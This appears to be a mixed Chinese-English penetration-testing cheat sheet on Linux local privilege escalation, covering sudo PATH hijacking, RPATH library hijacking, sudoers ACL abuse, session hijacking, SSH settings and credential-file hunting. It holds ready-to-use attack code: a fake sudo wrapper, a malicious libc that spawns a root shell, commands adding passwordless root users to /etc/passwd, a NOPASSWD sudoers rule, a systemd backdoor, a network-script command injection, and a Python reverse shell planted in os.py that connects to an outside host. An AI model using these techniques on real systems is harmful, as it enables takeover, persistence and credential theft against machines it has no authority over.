如果你知道某个 **user 通常会连接到一台机器并使用 `sudo`** 来提升权限，而且你已经拿到了该 user 上下文中的 shell，那么你可以 **创建一个新的 sudo executable**，让它先以 root 执行你的代码，然后再执行 user 的命令。接着，**修改该 user 上下文的 $PATH**（例如在 .bash_profile 中添加新的 path），这样当 user 执行 sudo 时，就会执行你的 sudo executable。

注意，如果 user 使用的是不同的 shell（不是 bash），你需要修改其他文件来添加新的 path。例如，[sudo-piggyback](https://github.com/APTy/sudo-piggyback) 会修改 `~/.bashrc`、`~/.zshrc`、`~/.bash_profile`。你还可以在 [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) 中找到另一个示例。

或者运行类似这样的命令：
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

文件 `/etc/ld.so.conf` 指示 **已加载的配置文件来自哪里**。通常，这个文件包含以下路径：`include /etc/ld.so.conf.d/*.conf`

这意味着 `/etc/ld.so.conf.d/*.conf` 中的配置文件会被读取。这个配置文件 **指向其他文件夹**，系统会在这些文件夹中 **搜索** **libraries**。例如，`/etc/ld.so.conf.d/libc.conf` 的内容是 `/usr/local/lib`。**这意味着系统会在 `/usr/local/lib` 中搜索 libraries**。

如果由于某些原因，**用户对以下任意路径具有写权限**：`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 中的任何文件，或者 `/etc/ld.so.conf.d/*.conf` 配置文件中指向的任何文件夹，他可能能够提升权限。\
查看以下页面了解 **如何利用这种错误配置**：


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
将 lib 复制到 `/var/tmp/flag15/` 后，程序会按照 `RPATH` 变量中的指定，在这个位置使用它。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
然后在 `/var/tmp` 中创建一个恶意库，使用 `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities provide a **subset of the available root privileges to a process**. This effectively breaks up root **特权 into smaller and distinctive units**. Each of these units can then be independently granted to processes. This way the full set of privileges is reduced, decreasing the risks of exploitation.\
Read the following page to **learn more about capabilities and how to abuse them**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

In a directory, the **bit for "execute"** implies that the user affected can "**cd**" into the folder.\
The **"read"** bit implies the user can **list** the **files**, and the **"write"** bit implies the user can **delete** and **create** new **files**.

## ACLs

Access Control Lists (ACLs) represent the secondary layer of discretionary permissions, capable of **overriding the traditional ugo/rwx permissions**. These permissions enhance control over file or directory access by allowing or denying rights to specific users who are not the owners or part of the group. This level of **granularity ensures more precise access management**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Give** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**从**系统中获取具有特定 ACL 的文件：
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### `sudoers` drop-ins 上的隐藏 ACL 后门

一个常见的错误配置是：`/etc/sudoers.d/` 中一个由 root 拥有、模式为 `440` 的文件，仍然通过 ACL 赋予了低权限用户写入权限。
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
如果你看到类似 `user:alice:rw-` 的内容，即使模式位限制很严格，用户仍然可以追加一条 sudo 规则：
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
这是一个高影响的 ACL persistence/privesc 路径，因为它很容易在仅用 `ls -l` 的检查中被忽略。

## Open shell sessions

在 **旧版本** 中，你可以 **hijack** 其他用户（**root**）的某个 **shell** session。\
在 **最新版本** 中，你只能 **connect** 到你自己用户的 screen sessions。不过，你仍然可能在该 session 中找到 **interesting information**。

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**附加到会话**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

这是 **旧版 tmux** 的一个问题。我无法以非特权用户身份劫持由 root 创建的 tmux (v2.1) 会话。

**列出 tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**附加到一个会话**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
This bug is caused when creating a new ssh key in those OS, as **only 32,768 variations were possible**. This means that all the possibilities can be calculated and **having the ssh public key you can search for the corresponding private key**. You can find the calculated possibilities here: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** 指定是否允许 password authentication。默认是 `no`。
- **PubkeyAuthentication:** 指定是否允许 public key authentication。默认是 `yes`。
- **PermitEmptyPasswords**: 当允许 password authentication 时，它指定 server 是否允许使用空密码字符串的账户登录。默认是 `no`。

### Login control files

These files 影响谁可以登录以及如何登录：

- **`/etc/nologin`**: 如果存在，会阻止非 root 登录并显示其消息。
- **`/etc/securetty`**: 限制 root 可以从哪里登录（TTY allowlist）。
- **`/etc/motd`**: 登录后 banner（可能 leak 环境或维护细节）。

### PermitRootLogin

指定 root 是否可以使用 ssh 登录，默认是 `no`。Possible values:

- `yes`: root 可以使用 password 和 private key 登录
- `without-password` or `prohibit-password`: root 只能使用 private key 登录
- `forced-commands-only`: Root 只能使用 private key 登录，并且如果指定了 commands options
- `no` : no

### AuthorizedKeysFile

指定包含可用于用户认证的 public keys 的文件。它可以包含像 `%h` 这样的 token，会被替换为 home directory。**You can indicate absolute paths** (starting in `/`) or **relative paths from the user's home**。For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
该配置将表明，如果你使用用户 "**testusername**" 的 **private** key 尝试登录，ssh 会将你的 key 的 public key 与位于 `/home/testusername/.ssh/authorized_keys` 和 `/home/testusername/access` 中的 key 进行比较

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding 允许你**使用本地 SSH keys**，而不是把 keys（没有 passphrases！）留在你的服务器上。这样，你就可以通过 ssh **跳转**到一台 **host**，然后从那里**跳转**到另一台 **host**，并**使用**你**初始 host** 上的 **key**。

你需要在 `$HOME/.ssh.config` 中这样设置这个选项：
```
Host example.com
ForwardAgent yes
```
注意，如果 `Host` 是 `*`，每次用户跳转到不同的机器时，该主机都将能够访问这些 keys（这是一个安全问题）。

文件 `/etc/ssh_config` 可以 **override** 这个 **options** 并允许或拒绝该配置。\
文件 `/etc/sshd_config` 可以使用关键字 `AllowAgentForwarding` 来**允许**或**拒绝** ssh-agent forwarding（默认是允许）。

如果你发现 Forward Agent 在某个环境中已配置，请阅读以下页面，因为**你可能可以滥用它来提升权限**：


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interesting Files

### Profiles files

文件 `/etc/profile` 和 `/etc/profile.d/` 下的文件是**在用户运行新 shell 时执行的脚本**。因此，如果你能**写入或修改其中任何一个，就可以提升权限**。
```bash
ls -l /etc/profile /etc/profile.d/
```
如果发现任何奇怪的 profile script，你应该检查其中是否包含**敏感信息**。

### Passwd/Shadow Files

根据 OS 不同，`/etc/passwd` 和 `/etc/shadow` 文件可能使用不同的名称，或者可能存在备份。因此，建议**把它们全部找出来**，并**检查是否可以读取**，看看文件里**是否有 hashes**：
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
在某些情况下，你可以在 `/etc/passwd`（或等效）文件中找到 **password hashes**
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 可写的 /etc/passwd

首先，使用以下命令之一生成一个密码。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
请添加用户 `hacker` 并添加生成的密码。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例如：`hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

现在你可以使用 `su` 命令配合 `hacker:hacker`

或者，你可以使用以下行添加一个没有密码的虚拟用户。\
WARNING: 你可能会降低当前机器的安全性。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTE: 在 BSD 平台中，`/etc/passwd` 位于 `/etc/pwd.db` 和 `/etc/master.passwd`，此外 `/etc/shadow` 被重命名为 `/etc/spwd.db`。

你应该检查你是否可以**写入某些敏感文件**。例如，你能否写入某个**服务配置文件**？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例如，如果机器正在运行一个 **tomcat** 服务器，并且你可以 **修改位于 /etc/systemd/ 内的 Tomcat 服务配置文件，** 那么你可以修改以下几行：
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Your backdoor 将在 tomcat 下次启动时执行。

### 检查文件夹

以下文件夹可能包含备份或有趣的信息：**/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root**（你可能无法读取最后一个，但可以试试）
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇怪位置/Owned 文件
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 最近几分钟修改的文件
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB 文件
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml 文件
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隐藏文件
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH 中的 Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web files**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **备份**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### 已知包含密码的文件

阅读 [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) 的代码，它会搜索**多个可能包含密码的文件**。\
**另一个有用的工具**是 [**LaZagne**](https://github.com/AlessandroZ/LaZagne)，这是一个开源应用，用于从 Windows、Linux 和 Mac 的本地计算机中提取存储的大量密码。

### Logs

如果你可以读取 logs，你也许能在其中找到**有趣/机密信息**。log 越奇怪，通常就越有趣（可能如此）。\
另外，一些配置**“糟糕”**的（带后门的？）**audit logs** 可能允许你在 audit logs 中**记录密码**，如下文所述：[https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/)
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
为了**读取日志**，组 [**adm**](interesting-groups-linux-pe/index.html#adm-group) 会非常有帮助。

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### 通用 Creds 搜索/Regex

你还应该检查文件名中包含 "**password**" 的文件，或内容中包含 "**password**" 的文件，以及日志中的 IP 和 emails，或者 hashes regexps。\
我不会在这里列出如何完成这些操作，但如果你感兴趣，可以查看 [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) 执行的最后几项检查。

## Writable files

### Python library hijacking

如果你知道一个 python 脚本将从 **哪里** 执行，并且你 **可以写入** 该文件夹，或者你 **可以修改 python libraries**，你就可以修改 OS library 并对其植入 backdoor（如果你能写入 python 脚本将要执行的位置，就复制并粘贴 os.py library）。

要 **backdoor the library**，只需在 os.py library 的末尾添加如下行（更改 IP 和 PORT）：
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate` 中的一个漏洞允许对日志文件或其父目录具有 **write permissions** 的用户潜在获得提权。原因是 `logrotate` 通常以 **root** 运行，可以被操纵去执行任意文件，尤其是在 _**/etc/bash_completion.d/**_ 这样的目录中。重要的是，不仅要检查 _/var/log_，还要检查应用了日志轮转的任何目录的权限。

> [!TIP]
> 此漏洞影响 `logrotate` `3.18.0` 及更早版本

关于该漏洞的更多详细信息可在此页面找到：[https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。

你可以使用 [**logrotten**](https://github.com/whotwagner/logrotten) 利用这个漏洞。

这个漏洞与 [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** 非常相似，所以当你发现可以修改 logs 时，检查是谁在管理这些 logs，并查看是否可以通过用 symlinks 替换 logs 来提权。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

如果由于某种原因，用户能够向 _/etc/sysconfig/network-scripts_ 写入一个 `ifcf-<whatever>` 脚本，**或者** 能够 **adjust** 一个已有脚本，那么你的 **system is pwned**。

Network scripts，比如 _ifcg-eth0_，用于网络连接。它们看起来和 .INI 文件完全一样。然而，在 Linux 上它们会被 Network Manager (dispatcher.d) \~sourced\~。

在我的案例中，这些 network scripts 里的 `NAME=` 属性处理不正确。如果名称中包含 **white/blank space**，系统会尝试执行空格后面的那部分。也就是说，**第一个空格之后的所有内容都会作为 root 执行**。

例如： _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_注意 Network 和 /bin/id 之间的空格_)

### **init, init.d, systemd, and rc.d**

目录 `/etc/init.d` 是 **scripts** 的所在位置，用于 System V init（SysVinit），这是 **经典的 Linux 服务管理系统**。它包含用于 `start`、`stop`、`restart`，有时还有 `reload` services 的脚本。这些脚本可以直接执行，也可以通过 `/etc/rc?.d/` 中的符号链接执行。Redhat 系统中的另一个路径是 `/etc/rc.d/init.d`。

另一方面，`/etc/init` 与 **Upstart** 相关，这是 Ubuntu 引入的较新的 **service management**，使用配置文件来执行服务管理任务。尽管已经过渡到 Upstart，但由于 Upstart 中存在兼容层，SysVinit scripts 仍然会与 Upstart 配置一起使用。

**systemd** 是一种现代的初始化和服务管理器，提供按需启动 daemon、automount 管理和 system state snapshots 等高级功能。它将文件组织到 `/usr/lib/systemd/`（用于 distribution packages）和 `/etc/systemd/system/`（用于 administrator modifications）中，从而简化系统管理流程。

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks commonly hook a syscall to expose privileged kernel functionality to a userspace manager. Weak manager authentication (e.g., signature checks based on FD-order or poor password schemes) can enable a local app to impersonate the manager and escalate to root on already-rooted devices. Learn more and exploitation details here:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

基于 regex 的 VMware Tools/Aria Operations service discovery 可以从 process command lines 中提取 binary path，并在特权上下文下以 -v 执行它。宽松的模式（例如使用 \S）可能会匹配攻击者在可写位置（例如 /tmp/httpd）放置的 listener，从而导致以 root 执行（CWE-426 Untrusted Search Path）。

在这里了解更多内容并查看适用于其他 discovery/monitoring stacks 的通用模式：

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [Python importlib docs](https://docs.python.org/3/library/importlib.html)

{{#include ../../banners/hacktricks-training.md}}
